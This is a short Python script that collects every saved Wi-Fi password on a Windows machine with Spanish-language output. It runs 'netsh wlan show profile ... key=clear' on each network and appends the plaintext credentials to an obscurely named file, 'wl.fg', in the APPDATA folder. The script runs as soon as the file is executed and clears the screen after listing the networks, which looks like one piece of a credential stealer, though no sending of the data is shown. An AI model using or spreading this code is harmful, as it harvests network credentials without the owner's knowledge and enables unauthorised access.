import subprocess
import re
import os
from colorama import Fore, init, Back
init()

"""
This file gets wifi passwords and write them into wl.fg
"""

def win_wifipsswds():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    network_names_list = re.findall("Perfil\s *.*", str(networks))
    network_names_list = str(network_names_list).split("Perfil de todos los usuarios     : ")
    fnnl = []
    for x in network_names_list:
        if x == "Perfil de todos los usuarios     : ":
            continue
        elif x == "":
            continue
        else:
            x = x[0:-10:]
            if not " " in x:
                fnnl.append(x)
                print(f"\"{x}\"")
            else:
                x = x[0:-5]
                fnnl.append(x)
                print(f"\"{x}\"")
    fnnl.pop(0)
    print(f"\n{Fore.RED}[ REDES ENCONTRADAS ]{Fore.RESET}\n")
    result = ""
    auxiliar = ""
    auxiliar += "-- Wifi \n"
    os.system("cls")
    for network_name in fnnl:
        try:
            command = f"netsh wlan show profile \"{network_name}\" key=clear"
            current_result = subprocess.check_output(command)
            network_names_list = re.findall("Contenido de la clave  : .*", str(current_result))
            network_names_list = str(network_names_list).split("Contenido de la clave  : ")
            contras = network_names_list[1]
            contra = ""
            for letter in contras:
                if not letter == "\\":
                    contra += letter
                else:
                    break
            print(f"{Fore.RED}► {Fore.RESET}{network_name} : {contra}")
        
            auxiliar += f"{network_name} : {contra}\n"
        except:
            continue
    ptp = os.environ['appdata']
    fss = open(f"{ptp}{os.sep}wl.fg", "a")
    fss.write(auxiliar)
    fss.close()

win_wifipsswds()

